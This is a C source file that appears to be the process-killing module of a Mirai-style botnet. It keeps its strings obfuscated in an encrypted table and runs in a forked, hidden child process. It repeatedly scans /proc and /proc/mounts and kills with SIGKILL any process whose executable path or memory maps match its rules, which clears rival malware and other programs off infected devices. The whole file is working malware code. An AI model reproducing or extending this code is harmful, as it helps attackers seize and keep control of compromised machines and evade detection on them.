#define _GNU_SOURCE

#include <fcntl.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/mount.h>

#include "dbg.h"
#include "bool.h"
#include "hide.h"
#include "util.h"
#include "table.h"

static char self_realpath[PATH_MAX] = {0};

static uint8_t killer_table_vals[] = {
    TABLE_KILLER_PROC,
    TABLE_KILLER_EXE,
    TABLE_KILLER_SO,
    TABLE_KILLER_STDIN,
    TABLE_KILLER_NULL,
    TABLE_KILLER_CONSOLE,
    TABLE_KILLER_MAPS
};

static void kill_mounts(void) {

    table_unlock_val(TABLE_KILLER_MOUNTS);
    int fd = open(table[TABLE_KILLER_MOUNTS].str, O_RDONLY);
    table_lock_val(TABLE_KILLER_MOUNTS);

    if (fd == -1)
        return;

    table_unlock_val(TABLE_KILLER_PROC);

    while (TRUE) {

        char rdbuf[256] = {0};

        if (util_read(fd, rdbuf, sizeof(rdbuf)) == NULL)
            break;

        int pos = util_memsearch(rdbuf, strlen(rdbuf), table[TABLE_KILLER_PROC].str, table[TABLE_KILLER_PROC].len);

        if (pos) {
            pid_t pid = atoi(rdbuf + pos);

            if (pid && pid != getpid() && pid != getppid()) {
                DEBUG_PRINT("[killer] killing mounted pid: (\'%d\')\n", pid);

		/*
                char fd_path[32] = {0};
                strcpy(fd_path, table[TABLE_KILLER_PROC].str);
                strcat(fd_path, pid);
                umount(fd_path);
		*/
#ifndef DEBUG
                kill(pid, SIGKILL);
#endif
            }
        }
    }

    table_lock_val(TABLE_KILLER_PROC);
    close(fd);
}

static BOOL check_pid_maps(char *pid) {

    char maps_path[32] = {0};

    strcpy(maps_path, table[TABLE_KILLER_PROC].str);
    strcat(maps_path, pid);
    strcat(maps_path, table[TABLE_KILLER_MAPS].str);

    int fd = open(maps_path, O_RDONLY);

    if (fd == -1)
        return FALSE;

    BOOL found = FALSE;
    int found_c = 0;

    while (TRUE) {

        char rdbuf[1024] = {0};

        if (util_read(fd, rdbuf, sizeof(rdbuf)) == NULL)
            break;

        if (util_memsearch(rdbuf, strlen(rdbuf), table[TABLE_KILLER_SO].str, table[TABLE_KILLER_SO].len)) {
            found_c++;
            if (found_c == 2) {
//		DEBUG_PRINT("found .so 2 times\n");
                found = TRUE;
                break;
            }
        }
    }

    close(fd);
    return found ? FALSE : TRUE;
}

#ifdef OLD_KILLER
static BOOL check_pid_stdin(char *pid) {

    char fd_path[32] = {0}, rdbuf[16] = {0};

    strcpy(fd_path, table[TABLE_KILLER_PROC].str);
    strcat(fd_path, pid);
    strcat(fd_path, table[TABLE_KILLER_STDIN].str);

    if (readlink(fd_path, rdbuf, sizeof(rdbuf) - 1) == -1 || !strncmp(rdbuf, table[TABLE_KILLER_NULL].str, table[TABLE_KILLER_NULL].len) || !strncmp(rdbuf, table[TABLE_KILLER_CONSOLE].str, table[TABLE_KILLER_CONSOLE].len))
        return FALSE;

    return check_pid_maps(pid);
}
#endif

static BOOL check_pid_realpath(char *pid) {

    int len;
    char exe_path[32] = {0}, realpath[PATH_MAX] = {0};

    strcpy(exe_path, table[TABLE_KILLER_PROC].str);
    strcat(exe_path, pid);
    strcat(exe_path, table[TABLE_KILLER_EXE].str);

    if ((len = readlink(exe_path, realpath, sizeof(realpath) - 1)) == -1 || !strcmp(realpath, self_realpath))
        return FALSE;

    if (util_memsearch(realpath, len, table[TABLE_KILLER_SO].str, table[TABLE_KILLER_SO].len))
        return TRUE;

#ifdef OLD_KILLER
    return check_pid_stdin(pid);
#else
    return check_pid_maps(pid);
#endif
}

static void killer(void) {
    table_unlock_val(TABLE_KILLER_SELF);

    if (readlink(table[TABLE_KILLER_SELF].str, self_realpath, sizeof(self_realpath) - 1) == -1) {
        DEBUG_PRINT("[killer] readlink failed\n");
        table_lock_val(TABLE_KILLER_SELF);
        return;
    }

    table_lock_val(TABLE_KILLER_SELF);

    // DEBUG_PRINT("[killer] self_realpath: (\"%s\")\n", self_realpath);

    table_unlock_val(TABLE_KILLER_PROC);
    DIR *dir = opendir(table[TABLE_KILLER_PROC].str);
    table_lock_val(TABLE_KILLER_PROC);

    if (!dir) {
        DEBUG_PRINT("[killer] opendir() failed\n");
        return;
    }

    int loc = 0;
    struct dirent *entry;

    while ((entry = readdir(dir))) {
        if (*entry->d_name >= '0' && *entry->d_name <= '9') {
            loc = telldir(dir);
            break;
        }
    }

    while (TRUE) {
	for (unsigned int i = 0; i < (sizeof(killer_table_vals) / sizeof(killer_table_vals[0])); i++)
	    table_unlock_val(killer_table_vals[i]);

	seekdir(dir, loc);

	while ((entry = readdir(dir))) {
	    if (check_pid_realpath(entry->d_name)) {
		DEBUG_PRINT("[killer] killing pid: (\'%s\')\n", entry->d_name);
#ifndef DEBUG
		kill(atoi(entry->d_name), SIGKILL);
#endif
	    }
	}

	for (unsigned int i = 0; i < (sizeof(killer_table_vals) / sizeof(killer_table_vals[0])); i++)
	    table_lock_val(killer_table_vals[i]);
#ifdef DEBUG
	usleep(5000000);
#elif OLD_KILLER
	break;
#elif SLOW
        usleep(1000000);
#else
	usleep(250000);
#endif
    }

    closedir(dir);
}


void killer_init(void) {
    if (fork() != 0) {
        sleep(1);
        return;
    }

    prctl(PR_SET_PDEATHSIG, SIGKILL);
    hide_pid();

    DEBUG_PRINT("[killer_init] started: (\'%d\')\n", getpid());

    kill_mounts();
    killer();

    exit(0);
}
